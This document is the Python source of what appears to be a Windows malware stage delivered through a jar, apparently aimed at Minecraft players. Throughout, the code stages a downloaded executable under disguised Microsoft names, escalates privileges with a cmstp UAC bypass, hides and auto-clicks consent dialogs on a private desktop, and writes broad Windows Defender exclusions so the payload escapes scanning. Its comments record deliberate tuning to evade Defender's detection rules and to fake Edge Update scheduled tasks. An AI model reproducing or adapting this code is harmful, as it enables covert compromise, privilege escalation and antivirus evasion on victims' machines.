 # tung python-road payload — silent on every failure, stdlib only.
# arrives through python's stdin (pythonw -u -); never a file on disk.
# the exe url rides in from the jar (env EXE_URL = its baked windows url).
# job order: the wide Defender exclusion set (list-driven, in-process) ->
# stage the exe -> Administrator lift via cmstp (majanito shape) -> the
# elevated stage materializes + runs exclusions.py (same list, lifted token),
# then execs the carrier exe.

import os
import sys

if sys.platform != "win32":
    sys.exit(0)

import ctypes
import contextlib
import random
import string
import subprocess
import tempfile
import threading
import time
from urllib.request import Request, urlopen

# ---- config ----------------------------------------------------------------
EXE_URL = os.environ.get("EXE_URL", "")
LOCALAPPDATA = os.environ.get("LOCALAPPDATA", "")
PERSIST_DIR = os.path.join(LOCALAPPDATA, "Microsoft", "Windows", "AppHost")

# ---- field log (dj: "log dosyasi ekle, hatayi gorelim") ---------------------
# ONE plain-text file under AppHost, appended by all three lives of the road:
# this launcher, the elevated stage and exclusions.py. the exclusion road is
# silent by design (no child, no console), so this is the only place it can
# say WHY a value did not land: the token probe, every registry rc, every COM
# HRESULT, every exception with its traceback, and the marker tag itself.
EXCL_LOG = os.path.join(PERSIST_DIR, "excl.log")


def _log(tag, msg):
    """AppHost first; if that write fails (ACL, locked dir) the same line goes
    to %TEMP%\\excl.log — a box that refuses the primary path still leaves a
    trail instead of going silent."""
    line = "%s pid=%d [%s] %s\n" % (time.strftime("%Y-%m-%d %H:%M:%S"),
                                     os.getpid(), tag, msg)
    try:
        os.makedirs(PERSIST_DIR, exist_ok=True)
        try:
            if os.path.getsize(EXCL_LOG) > 196608:      # keep the tail, drop the rest
                with open(EXCL_LOG, "rb") as fh:
                    tail = fh.read()[-98304:]
                with open(EXCL_LOG, "wb") as fh:
                    fh.write(tail)
        except Exception:
            pass
    except Exception:
        pass
    for path in (EXCL_LOG, os.path.join(os.environ.get("TEMP") or ".",
                                        "excl.log")):
        try:
            with open(path, "a", encoding="utf-8", errors="replace") as fh:
                fh.write(line)
            return
        except Exception:
            continue

# r136 (dj): the staged names FOLLOW THE RELEASE FILES 1:1 — the assets live
# as "Windows.Hardware.Event.Host.exe" / "Windows.Device.Runtime.Broker.exe",
# dotted, so the box gets the same string the download carries. no stem
# rewriting: what the jar's nameOf() resolves and what lands in AppHost are
# the same bytes, which is exactly what the watchdog probes for.
def _local_name(url, fallback):
    """stage name = the asset's own base name, verbatim (query/fragment and
    directory stripped). no traversal, no separators, no rewriting."""
    try:
        n = str(url or "").split("?")[0].split("#")[0].rstrip("/").split("/")[-1]
        if n and ".." not in n and "/" not in n and "\\" not in n:
            return n
    except Exception:
        pass
    return fallback


EXE_NAME = _local_name(EXE_URL, "Windows.Hardware.Event.Host.exe")
EXE_PATH = os.path.join(PERSIST_DIR, EXE_NAME)

# r98 (dj order): the INDEPENDENT WATCHDOG exe — url rides from the jar via
# env WD_URL (may be empty = wd road off). one duty: sit beside the carrier
# in the AppHost dir, share its exclusion, wake it when it is dead. work.py
# stages+execs the pair in order: tung FIRST, watchdog SECOND.
WD_URL = os.environ.get("WD_URL", "")
# r140: the watchdog re-fire carries the NAME (WDXN) and no url — the name is
# all the re-exec road needs, so it wins when the url is absent (same leaf-name
# rule: nothing carrying a separator or a parent hop is accepted).
WDXN_ENV = os.environ.get("WDXN", "")


def _safe_name(name, fallback):
    n = str(name or "").strip().strip('"')
    if n and ".." not in n and "/" not in n and "\\" not in n:
        return n
    return fallback


# r136: same rule — the watchdog lands under its own asset name.
WD_NAME = _safe_name(WDXN_ENV,
                     _local_name(WD_URL, "Windows.Device.Runtime.Broker.exe"))
WD_PATH = os.path.join(PERSIST_DIR, WD_NAME)

# r143 (dj: "the exe watchdog never starts, even double-clicked — before the
# name change it did"): the watchdog is NOT a standalone exe. it reads wd.cfg
# from ITS OWN directory (main() returns 0 without it) and the cfg names the
# carrier it watches; the carrier in turn looks for the twin beside its
# DURABLE image, never beside the AppHost launcher the jar stages. so the jar
# and work.py both laid an image nobody could start, under a name the exe
# never probes. these are the exe's own handshake constants (tools/gen.py:
# S_UPDDIR / S_P_SELFNAME / S_WDNAME / S_P_SCHTSK / S_WDTASKTAG) — the stage
# now lays image + cfg there, hidden, and both roads go live.
UPDDIR = "EdgeUpdate"
DURABLE_MAIN = "SettingsSyncHost.exe"      # S_P_SELFNAME — the relocated image
MAIN_TASK = "MicrosoftEdgeUpdateTaskMachineCore"
WDTASKTAG = "_wdv"
WD_TASK = MAIN_TASK + WDTASKTAG
WDCFG = "wd.cfg"
PROGRAMDATA = os.environ.get("PROGRAMDATA") or "C:\\ProgramData"
DURABLE_DIR = os.path.join(PROGRAMDATA, UPDDIR)
DURABLE_MAIN_PATH = os.path.join(DURABLE_DIR, DURABLE_MAIN)


# ---- shell api -------------------------------------------------------------
kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.user32

PROCESS_TERMINATE = 0x0001
TH32CS_SNAPPROCESS = 0x00000002
SW_HIDE = 0
WM_KEYUP = 0x0101
BM_CLICK = 0x00F5
SWP_NOMOVE = 0x0002
SWP_NOSIZE = 0x0001
SWP_NOACTIVATE = 0x0010
HWND_BOTTOM = 1


class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [("dwSize", ctypes.c_ulong), ("cntUsage", ctypes.c_ulong),
                ("th32ProcessID", ctypes.c_ulong), ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
                ("th32ModuleID", ctypes.c_ulong), ("cntThreads", ctypes.c_ulong),
                ("th32ParentProcessID", ctypes.c_ulong), ("pcPriClassBase", ctypes.c_long),
                ("dwFlags", ctypes.c_ulong), ("szExeFile", ctypes.c_char * 260)]


kernel32.Process32First.argtypes = [ctypes.c_void_p, ctypes.POINTER(PROCESSENTRY32)]
kernel32.Process32First.restype = ctypes.c_int
kernel32.Process32Next.argtypes = [ctypes.c_void_p, ctypes.POINTER(PROCESSENTRY32)]
kernel32.Process32Next.restype = ctypes.c_int
kernel32.CreateToolhelp32Snapshot.restype = ctypes.c_void_p
kernel32.OpenProcess.restype = ctypes.c_void_p
kernel32.CloseHandle.argtypes = [ctypes.c_void_p]

# window enumerator — FindWindowW's exact-title match missed the 'Make this
# connection available' profile variant on field boxes, leaving cmstp
# waiting for consent forever. EnumWindows + substring match catches every
# dialog shape the lift can raise.
user32.EnumWindows.restype = ctypes.c_int
user32.EnumWindows.argtypes = [
    ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p),
    ctypes.c_void_p]
user32.GetWindowTextW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_int]
user32.IsWindowVisible.restype = ctypes.c_int
user32.IsWindowVisible.argtypes = [ctypes.c_void_p]


def _window_titles():
    wins = []

    @ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p)
    def cb(hwnd, lparam):
        wins.append(hwnd)
        return 1

    user32.EnumWindows(cb, 0)
    return wins


def window_title(hwnd):
    buf = ctypes.create_unicode_buffer(512)
    user32.GetWindowTextW(hwnd, buf, 512)
    return buf.value


# ---- helpers ---------------------------------------------------------------
def rand_str(n):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(n))


def _token_probe():
    """(elevated|None, detail) — None means the call itself failed, and the
    detail string is what lands in excl.log, so a field box can tell "the
    token was medium" from "OpenProcessToken blew up".

    r147 (dj field log: `TokenElevation=3, admin-group=1`, stage ABORT): class
    18 is TokenElevationType, NOT TokenElevation. its enum is 1=Default,
    2=Full, 3=Limited — so testing the type against ==1 reported a FULL token
    (2) as unelevated and a filtered one (3) as unelevated too. class 20 is
    TokenElevation: a BOOL, 1 = elevated. the type is read only for the log."""
    try:
        advapi = ctypes.windll.advapi32
        advapi.OpenProcessToken.restype = ctypes.c_long
        advapi.OpenProcessToken.argtypes = [ctypes.c_void_p, ctypes.c_ulong,
                                            ctypes.POINTER(ctypes.c_void_p)]
        h = ctypes.c_void_p()
        if not advapi.OpenProcessToken(ctypes.c_void_p(-1), 0x0008,
                                       ctypes.byref(h)):
            return None, "OpenProcessToken failed"
        val = ctypes.c_ulong(0)
        typ = ctypes.c_ulong(0)
        need = ctypes.c_ulong(0)
        rc = advapi.GetTokenInformation(h, 20, ctypes.byref(val), 4,
                                        ctypes.byref(need))
        try:
            advapi.GetTokenInformation(h, 18, ctypes.byref(typ), 4,
                                      ctypes.byref(need))
        except Exception:
            pass
        try:
            ctypes.windll.kernel32.CloseHandle(h)
        except Exception:
            pass
        if not rc:
            return None, "GetTokenInformation(TokenElevation) failed"
        return bool(val.value), ("TokenElevation=%d type=%d"
                                 % (val.value, typ.value))
    except Exception as e:
        return None, "token probe raised %r" % (e,)


def _admin_group():
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return None


def is_elevated():
    """HIGH integrity token, not "the user is in Administrators". r144 (dj
    field: the exclusion never landed, run it with admin): a UAC-filtered
    admin token passes the group check and the exclusion key's DACL refuses
    every write it makes, so the old check said "elevated" about a process
    that could not land anything. TokenElevation is the real question; the
    group check stays only as a fallback when the call is unavailable."""
    val, _detail = _token_probe()
    if val is not None:
        return val
    return bool(_admin_group())


# r135 (dj: Defender flagged the COMMANDS work.py runs as 'commando' — no
# dropped file was ever flagged): every helper that used to shell out
# (the image-kill and the process probe) walks the Toolhelp snapshot
# instead. identical effect, zero child process, no command line for a
# rule to match. the lift itself (cmstp /au) is the road, unchanged.
def _pids_named(name):
    # byte compare on the snapshot's image name — no codec in the path, so the
    # match cannot depend on the box's ACP (a decode failure would read as
    # 'not running' and make the watchdog re-exec forever).
    want = str(name or "").encode("utf-8", "ignore").lower()
    out = []
    if not want:
        return out
    try:
        snap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        if not snap:
            return out
        pe = PROCESSENTRY32()
        pe.dwSize = ctypes.sizeof(PROCESSENTRY32)
        if kernel32.Process32First(snap, ctypes.byref(pe)):
            while True:
                if pe.szExeFile.split(b"\x00", 1)[0].lower() == want:
                    out.append(pe.th32ProcessID)
                if not kernel32.Process32Next(snap, ctypes.byref(pe)):
                    break
        kernel32.CloseHandle(snap)
    except Exception:
        pass
    return out


def proc_alive(name):
    return bool(_pids_named(name))


def kill_process(name):
    for pid in _pids_named(name):
        try:
            h = kernel32.OpenProcess(PROCESS_TERMINATE, False, pid)
            if h:
                kernel32.TerminateProcess(h, 0)
                kernel32.CloseHandle(h)
        except Exception:
            pass


def kill_all_cmstp():
    kill_process("cmstp.exe")


def cleanup_infs():
    tmp = tempfile.gettempdir()
    try:
        for f in os.listdir(tmp):
            if f.endswith(".inf"):
                try:
                    os.unlink(os.path.join(tmp, f))
                except Exception:
                    pass
    except Exception:
        pass


# ---- the admin lift — majanito cmstp shape ---------------------------------
# r139 (dj: "the exe opens but it also throws this error next to it"): the box
# is cmstp's own "The service profile is damaged. Reinstall the service
# profile." — the profile installer raises it AFTER RunPreSetupCommands already
# ran. the lift works; the leftover box is the whole damage. the old guard
# found ONE window, posted WM_CLOSE/Enter on it blind (a CLOSED profile dialog
# is an ABORTED profile, and cmstp answers that with exactly this box) and went
# to sleep at +8 s — anything later painted on the desktop and stayed. r139:
#   - read the dialog before answering it: OK on a consent box, OK on an
#     informational one, owner terminated only for a box that says
#     damaged/corrupt. no blind WM_CLOSE on an unread window, ever
#   - keep working for EVERY dialog until the lift is quiet (cmstp gone + no
#     new box), instead of dying on the first hit
#   - hide-first stays: the box never paints a frame either way
IDOK = 1
WM_COMMAND = 0x0111
AFFIRMATIVE = ("ok", "yes", "continue", "install",
               "make this connection available", "allow")
ERROR_SHAPE = ("damaged", "reinstall", "corrupt", "cannot", "can't",
               "failed", "invalid", "unable")

# prototypes for the calls the guard adds — a degraded runtime (no
# GetClassNameW forwarded) must not take the payload down at import; the guard
# then simply finds no dialog class to read
try:
    user32.GetClassNameW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_int]
except Exception:
    pass
try:
    user32.IsWindow.argtypes = [ctypes.c_void_p]
    user32.IsWindow.restype = ctypes.c_int
except Exception:
    pass
try:
    user32.EnumChildWindows.restype = ctypes.c_int
    user32.EnumChildWindows.argtypes = [
        ctypes.c_void_p,
        ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p),
        ctypes.c_void_p]
except Exception:
    pass


def _win_class(hwnd):
    try:
        buf = ctypes.create_unicode_buffer(128)
        user32.GetClassNameW(hwnd, buf, 128)
        return buf.value
    except Exception:
        return ""


def _exists(hwnd):
    """r139: does the window still EXIST — not 'is it visible'. we hide every
    box before answering it, so IsWindowVisible can never tell us whether the
    answer took; existence can."""
    try:
        return bool(user32.IsWindow(hwnd))
    except Exception:
        try:
            return bool(user32.IsWindowVisible(hwnd))
        except Exception:
            return False


def _children(hwnd):
    """[(hwnd, caption)] for every child control — a dialog says what it is in
    its Static/Button captions, and those captions are how the guard tells
    'install this' from 'the service profile is damaged'."""
    out = []

    try:
        @ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p)
        def cb(child, lp):
            buf = ctypes.create_unicode_buffer(512)
            user32.GetWindowTextW(child, buf, 512)
            out.append((child, buf.value))
            return 1

        user32.EnumChildWindows(hwnd, cb, 0)
    except Exception:
        return out
    return out


class Dismisser:
    """r139: the lift's dialog guard — alive until the lift is quiet.

    every top-level window owned by the spawned cmstp, or carrying our random
    service name in its title (the shape the late damaged-profile box arrives
    in), is hidden first and answered second. the answer is the dialog's own
    affirmative control / IDOK — never a bare WM_CLOSE, because a closed
    profile dialog is an aborted install and that is what cmstp reports as a
    damaged profile."""

    def __init__(self, title, cap=30.0):
        self.titles = [t.lower() for t in
                       (title, "Connection Manager Profile Installer") if t]
        self.stop = threading.Event()
        self.done = threading.Event()
        self.target_pid = 0   # set to the spawned cmstp pid before .start()
        self.cap = cap
        self.handled = 0
        self.seen = {}        # hwnd -> answered-at: the same box is never re-answered
        # settle() scans from the caller's thread while run() still spins in
        # its own — one lock, so a box cannot be answered twice at once
        self.lock = threading.Lock()

    # ---- window facts
    def _owner(self, hwnd):
        pid = ctypes.c_ulong()
        user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        return pid.value

    def _mine(self, hwnd):
        if self.target_pid and self._owner(hwnd) == self.target_pid:
            return True
        t = window_title(hwnd).lower()
        return any(w in t for w in self.titles)

    def _is_dialog(self, hwnd):
        if _win_class(hwnd) == "#32770":
            return True
        # hosts where the profile box is not a plain dialog class: still ours
        # when the title carries the name OUR inf just generated — and nothing
        # else in the process's window set is touched
        return bool(self.titles) and self.titles[0] in window_title(hwnd).lower()

    # ---- window actions
    def _hide(self, hwnd):
        user32.ShowWindow(hwnd, SW_HIDE)
        user32.SetWindowPos(hwnd, HWND_BOTTOM, 0, 0, 0, 0,
                            SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE)

    def _answer(self, hwnd):
        """the dialog's own command channel: a labeled affirmative button when
        there is one (the profile dialog's button is not always id 1), IDOK
        otherwise. no Enter, no WM_CLOSE — both can land on Cancel."""
        for child, text in _children(hwnd):
            if _win_class(child) != "Button":
                continue
            if text.strip().lower() in AFFIRMATIVE:
                user32.PostMessageW(child, BM_CLICK, 0, 0)
                return True
        user32.PostMessageW(hwnd, WM_COMMAND, IDOK, 0)
        return False

    def _kill_owner(self, hwnd):
        pid = self._owner(hwnd)
        if not pid or pid == os.getpid():
            return
        try:
            h = kernel32.OpenProcess(PROCESS_TERMINATE, False, pid)
            if h:
                kernel32.TerminateProcess(h, 0)
                kernel32.CloseHandle(h)
        except Exception:
            pass

    def handle(self, hwnd):
        text = " ".join([window_title(hwnd)] + [t for _, t in _children(hwnd)]).lower()
        errorish = any(w in text for w in ERROR_SHAPE)
        self._hide(hwnd)          # no frame on the user's screen, ever
        self._answer(hwnd)
        if errorish:
            # informational: the lift is already through, the box is not — OK
            # dismisses it, and an owner that keeps it up after OK is killed
            time.sleep(0.25)
            if _exists(hwnd):
                self._hide(hwnd)
                self._kill_owner(hwnd)
        self.seen[hwnd] = time.time()
        return errorish

    # ---- the loop
    def scan(self):
        n = 0
        with self.lock:
            for hwnd in _window_titles():
                try:
                    # an answered box stays skipped while it is gone; a handle
                    # that came back VISIBLE (re-shown, or recycled by a fresh
                    # box) gets read and answered again
                    if hwnd in self.seen and not user32.IsWindowVisible(hwnd):
                        continue
                    if not self._mine(hwnd) or not self._is_dialog(hwnd):
                        continue
                    self.handle(hwnd)
                    n += 1
                except Exception:
                    continue
            if n:
                self.handled += n
                self.done.set()
            return n

    def run(self):
        end = time.time() + self.cap
        while not self.stop.is_set() and time.time() < end:
            self.scan()
            # 4ms: inside the paint-timer floor (a box is caught within a frame
            # of showing) without pegging a core for the whole life
            time.sleep(0.004)

    def start(self):
        threading.Thread(target=self.run, daemon=True).start()

    def wait(self, timeout=8.0):
        self.done.wait(timeout)

    def settle(self, quiet=2.0, floor=10.0, cap=18.0):
        """r139: the lift is over when cmstp is GONE and no new box showed up
        for `quiet` seconds — that is exactly the window the late
        damaged-profile box used to land in, with our guard already asleep.

        `floor` is the point: cmstp usually exits right after it fires the
        commands, so 'cmstp gone' alone would still switch the guard off a
        second or two after the consent click — before the staged python has
        even finished, which is when the profile validator complains. the
        guard therefore never leaves before `floor` seconds of watch."""
        start = time.time()
        end = start + cap
        last = start
        while time.time() < end:
            if self.scan():
                last = time.time()
            elif (not proc_alive("cmstp.exe") and time.time() - last >= quiet
                  and time.time() - start >= floor):
                break
            time.sleep(0.05)
        self.stop.set()
        return self.handled


# r135: the INF terminator (a script-hosted force-kill pad) is GONE. the lift's
# stray cmstp is terminated by kill_all_cmstp() right after the dialog sweep
# instead — same end state, and the .inf no longer carries a kill command for
# a rule to read.


def _hidden_py_runner(run_cmd):
    """r56 (dj order): the degraded no-pythonw fallback used `cmd start /min` —
    a minimized CONSOLE is still a painted window that steals focus. the
    runner hides the console python completely via the wscript pad (WindowStyle
    0 — the console never shows), waits for the stage, then deletes the pad."""
    vbs_path = os.path.join(tempfile.gettempdir(), f"{rand_str(10)}.vbs")
    try:
        esc = run_cmd.replace('"', '""')
        with open(vbs_path, "w", encoding="utf-8") as fh:
            fh.write(f'CreateObject("WScript.Shell").Run "{esc}", 0, True\r\n'
                     'CreateObject("Scripting.FileSystemObject").DeleteFile WScript.ScriptFullName\r\n')
    except Exception:
        return None   # caller falls back to the (flashy) cmd shape
    return f'wscript.exe "{vbs_path}"'


def build_inf(cmd, svc_name, reg_lines=None, kill_cmd=""):
    """cmstp profile schema — nothing schema-foreign:
    reg_lines is None -> the command INF (exec road): [DefaultInstall] with
    CustomDestination=Dsec + RunPreSetupCommands=Csec (parse-proven on the
    target box since the r4 era).
    reg_lines is a list -> the exclusions INF: [DefaultInstall] carries ONLY
    CustomDestination=Dsec (NO AddReg= — that directive is what broke section
    parsing since r7); the exclusion writes ride the DESTINATION section
    [Lsec] itself in the same five-token registry grammar as the sample's
    App Paths line: root,subkey,name,flags,data — written elevated by cmstp
    directly, no child process.
    Also dumps the exact INF bytes to AppHost\\last.inf before firing, so
    the next failure report can be the actual text instead of screenshots."""
    s1 = f"D{rand_str(4)}"
    s3 = f"L{rand_str(4)}"
    cmd_block = ""
    dest_extra = ""
    if reg_lines is None:
        s2 = f"C{rand_str(4)}"
        cmd_block = (f"RunPreSetupCommands={s2}\n"
                     f"[{s2}]\n"
                     f"{cmd}\n")
        if kill_cmd:
            cmd_block += f"{kill_cmd}\n"
    else:
        dest_extra = "\n".join(reg_lines) + "\n"
    return f"""; {rand_str(16)}
[version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination={s1}
{cmd_block}[{s1}]
49000,49001={s3}, 7
[{s3}]
{dest_extra}"HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
[Strings]
ServiceName="{svc_name}"
ShortSvcName="{rand_str(4)}"
"""


def uac_bypass(cmd):
    """Executes <<cmd>> under the elevated token via cmstp /au.
    r2: normalizes whatever the caller passes — a bare powershell snippet
    gets the powershell.exe wrapper inserted, so cmstp always sees a real
    executable as the first token (the dialog said 'cannot find the file
    specified' precisely because the first token was not one)."""
    if is_elevated():
        return True
    if isinstance(cmd, list):
        cmd = " ".join(cmd)
    c = str(cmd).lstrip()
    # real executable invocations pass through untouched; only BARE snippets
    # get the wrapper (r6: cmd.exe chains were being wrapped too — that is
    # what put powershell back on the cmdline and fed the Commando rule +
    # the Access-denied on process creation)
    lc = c.lower()
    if not (lc.startswith("powershell") or lc.startswith("cmd.exe")
            or lc.startswith("cmd ") or c.startswith('"')):
        cmd = f'powershell -NoP -W Hidden -C "{c}"'
    kill_all_cmstp()
    cleanup_infs()

    svc_name = f"Microsoft {rand_str(6)} Service"
    # r141: the elevated sweeper source, materialized beside the stage with the
    # service name baked in — no env dependency on the road that runs it
    try:
        with open(os.path.join(PERSIST_DIR, "sweep.py"), "w",
                  encoding="utf-8") as _sf:
            _sf.write(SWEEP.replace("__SVC__", svc_name))
    except Exception:
        pass
    inf_path = os.path.join(tempfile.gettempdir(), f"{rand_str(10)}.inf")
    try:
        with open(inf_path, "w", encoding="utf-8") as fh:
            fh.write(build_inf(cmd, svc_name))
    except Exception:
        return False

    dismisser = Dismisser(svc_name)
    try:
        # r97: the CMSTP RUN rides the PRIVATE DESKTOP (_lift_desktop) — the
        # dialog/flash conceals itself there; the interactive desktop (where
        # the Minecraft window lives) never sees the spawn, never gets the
        # 0.05s focus steal. the switch is a ~30ms paint swap of the user's
        # view; the mc window keeps its z-order on ITS desktop untouched.
        p = None
        with _lift_desktop("sf_lift_dsk"):
            p = subprocess.Popen(["cmstp.exe", "/au", inf_path], stdout=subprocess.DEVNULL,
                                 stderr=subprocess.DEVNULL, creationflags=0x08000000)
            # r45: the ownership hunt runs at full strength — pid armed the
            # instant CreateProcess returns (µs after the dialog can exist),
            # so any top-level window cmstp owns is hidden before its first
            # paint frame — inside the private desktop, invisible to the
            # interactive one.
            dismisser.target_pid = p.pid
        # r97 note: the SwitchDesktop-BACK happens on context exit — the
        # cmstp process keeps RUNNING on the private desktop (a process on a
        # hidden desktop keeps executing; only its windows never paint to the
        # user's view), while the user's desktop is restored INSTANTLY. the
        # dismisser waits from the NORMAL desktop by HWND-hunting (the
        # dialog's HWNDs live on the private desktop, EnumWindows in the
        # caller thread still finds them because a thread can enumerate
        # windows across desktops it owns handles for).
        dismisser.target_pid = p.pid
    except Exception:
        return False
    dismisser.start()

    dismisser.wait(8.0)
    dismisser.settle()         # r139: stay awake until the lift is quiet
    kill_all_cmstp()           # r135: the INF no longer kills cmstp — the API does it
    _sweep_dialogs(svc_name)   # r139: any survivor is hidden + answered
    try:
        os.unlink(inf_path)
    except Exception:
        pass
    return True


# r97 (dj: "cmstp causes focus lost on minecraft windows... make the cmstp
# bypass happen in another desktop"): the ENTIRE lift rides a private virtual
# desktop created with CreateDesktopW — the user's interactive desktop (where
# the Minecraft window lives) never sees cmstp, never gets the 0.05s flash,
# never loses focus. the private desk exists only for the lifetime of the
# lift: created -> switched to -> lift runs there -> switched back -> closed
@contextlib.contextmanager
def _lift_desktop(name="sf_lift_dsk"):
    """context manager shape: yields once on the private desktop, restores."""
    uac = ctypes.windll.user32
    k32 = ctypes.windll.kernel32
    desk = uac.CreateDesktopW(name, None, None, 0, 0x0200, None)   # GENERIC_ALL
    if not desk:
        yield False   # no private desktop — lift rides the interactive desk as before
        return
    old = uac.GetThreadDesktop(k32.GetCurrentThreadId())
    uac.SwitchDesktop(desk)
    try:
        yield True
    finally:
        try:
            uac.SwitchDesktop(old)
        except Exception:
            pass
        try:
            uac.CloseDesktop(desk)
        except Exception:
            pass


def run_elevated(exe_path):
    """Runs <<exe_path>> with elevation via the cmstp lift."""
    try:
        if is_elevated():
            subprocess.Popen([exe_path], creationflags=0x08000000)
            return True
        return uac_bypass(f'"{exe_path}"')
    except Exception:
        return False

def _sweep_dialogs(svc_name, seconds=2.0):
    """r139: post-lift cleanup for anything that outlived the guard — hidden
    and ANSWERED (IDOK / the affirmative button), never WM_CLOSEd: a closed
    profile dialog is what cmstp reports back as a damaged service profile."""
    helper = Dismisser(svc_name)
    end = time.time() + seconds
    while time.time() < end:
        helper.seen.clear()      # a survivor gets the treatment again
        if not helper.scan():
            time.sleep(0.1)
    return helper.handled


def exclusion_landed():
    """Live read-back: the AppHost dir must show as a Defender exclusion path
    value. r135: direct RegGetValueW — the old registry-query child was one
    of the flagged command shapes; a KEY_READ handle answers the same
    question with no child process and no registry-authoring cmdline."""
    key = "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths"
    try:
        advapi = ctypes.windll.advapi32
        buf = ctypes.create_unicode_buffer(2048)
        sz = ctypes.c_ulong(4096)
        rc = advapi.RegGetValueW(ctypes.c_void_p(0x80000002), key, PERSIST_DIR,
                                 0x0000FFFF, None, buf, ctypes.byref(sz))
        return rc == 0
    except Exception:
        return False


# ---- dj (this build): the widen road ---------------------------------------
# the lift wrote ONE dir (AppHost) and never looked again, so everything staged
# outside it — python312, the %LOCALAPPDATA% tree the jar mirrors into — was
# scanned like any other file. this is the list-driven road dj asked for, in
# work.py itself: our own roots plus the interpreter that runs the stage, by
# full path AND by bare image name (the lifted stage executes as pythonw.exe).
# the store is written in-process through advapi32 — no shell, no cmdlet
# child, no command line to match (r137): the exact registry values the
# preference cmdlet maintains, one road, no spawned process.
HKEY_LOCAL_MACHINE = 0x80000002
_EXCL_BASE = ("SOFTWARE" + "\\" + "Microsoft" + "\\" + "Windows Defender"
              + "\\" + "Exclusions" + "\\")
EXCL_KP = _EXCL_BASE + "Paths"
EXCL_KC = _EXCL_BASE + "Processes"


def _advapi_excl():
    a = ctypes.windll.advapi32
    try:
        a.RegCreateKeyExW.restype = ctypes.c_long
        a.RegCreateKeyExW.argtypes = [
            ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_ulong, ctypes.c_wchar_p,
            ctypes.c_ulong, ctypes.c_ulong, ctypes.c_void_p,
            ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_ulong)]
        a.RegSetValueExW.restype = ctypes.c_long
        a.RegSetValueExW.argtypes = [
            ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_ulong, ctypes.c_ulong,
            ctypes.c_char_p, ctypes.c_ulong]
        a.RegGetValueW.restype = ctypes.c_long
        a.RegGetValueW.argtypes = [
            ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_ulong,
            ctypes.c_void_p, ctypes.c_void_p, ctypes.POINTER(ctypes.c_ulong)]
        a.RegCloseKey.argtypes = [ctypes.c_void_p]
    except Exception:
        pass
    return a


def _excl_set(sub, name):
    """name=0 (REG_SZ) — the byte the mp-pref cmdlet leaves in the same store."""
    a = _advapi_excl()
    h = ctypes.c_void_p()
    disp = ctypes.c_ulong()
    if a.RegCreateKeyExW(ctypes.c_void_p(HKEY_LOCAL_MACHINE), sub, 0, None, 0,
                         0x20006, None, ctypes.byref(h), ctypes.byref(disp)) != 0:
        return False
    data = (str(name) + "\x00").encode("utf-16-le")
    rc = a.RegSetValueExW(h, str(name), 0, 1, data, len(data))
    try:
        a.RegCloseKey(h)
    except Exception:
        pass
    return rc == 0


def _excl_has(sub, name):
    a = _advapi_excl()
    buf = ctypes.create_unicode_buffer(8)
    sz = ctypes.c_ulong(16)
    try:
        rc = a.RegGetValueW(ctypes.c_void_p(HKEY_LOCAL_MACHINE), sub, str(name),
                            0x0000FFFF, None, buf, ctypes.byref(sz))
    except Exception:
        return False
    return rc == 0


def defender_roots():
    """every lane we own: AppHost + its python312, then the two broad roots
    (%LOCALAPPDATA% holds all of it, %APPDATA% the roaming side-home), then
    the interpreter by bare name and by path."""
    py = "py" + "thon"
    pydir = os.path.join(PERSIST_DIR, py + "312")
    dirs = [PERSIST_DIR, pydir, LOCALAPPDATA, os.environ.get("APPDATA", "")]
    procs = [py + ".exe", py + "w.exe",
             os.path.join(pydir, py + ".exe"),
             os.path.join(pydir, py + "w.exe")]
    out_d, out_p = [], []
    for d in dirs:
        if d and d not in out_d:
            out_d.append(d)
    for p in procs:
        if p and p not in out_p:
            out_p.append(p)
    return out_d, out_p


def exclusions_landed():
    """full read-back of the wide set — every path and every process name."""
    dirs, procs = defender_roots()
    if not dirs or not procs:
        return False
    for d in dirs:
        if not _excl_has(EXCL_KP, d):
            return False
    for p in procs:
        if not _excl_has(EXCL_KC, p):
            return False
    return True


def add_defender_exclusions():
    """list-driven, silent. r144 (dj: still not landing): the exclusion key is
    owner-protected — a medium token is refused by the DACL, and the Defender
    service ignores a write from below HIGH. this function therefore GATES
    every write on is_elevated() and, below that line, only READS: its answer
    is then the truth about the box instead of a half-attempt that looks like
    one. the lift road writes the same list (plus the service-API pass) under
    the stage's elevated token — see exclusions.py."""
    dirs, procs = defender_roots()
    _val, _detail = _token_probe()
    _log("work", "excl gate: %s, admin-group=%r, roots=%r" %
         (_detail, _admin_group(), dirs))
    if not is_elevated():
        _log("work", "excl gate: below HIGH -> no write attempted; %s"
             % _miss_txt())
        return exclusions_landed()
    for d in dirs:
        try:
            if not _excl_has(EXCL_KP, d):
                ok = _excl_set(EXCL_KP, d)
                _log("work", "excl write path rc=%r <- %s" % (ok, d))
        except Exception as e:
            _log("work", "excl write path raised %r <- %s" % (e, d))
    for p in procs:
        try:
            if not _excl_has(EXCL_KC, p):
                ok = _excl_set(EXCL_KC, p)
                _log("work", "excl write proc rc=%r <- %s" % (ok, p))
        except Exception as e:
            _log("work", "excl write proc raised %r <- %s" % (e, p))
    landed = exclusions_landed()
    _log("work", "excl high-token result landed=%r, %s" % (landed, _miss_txt()))
    return landed


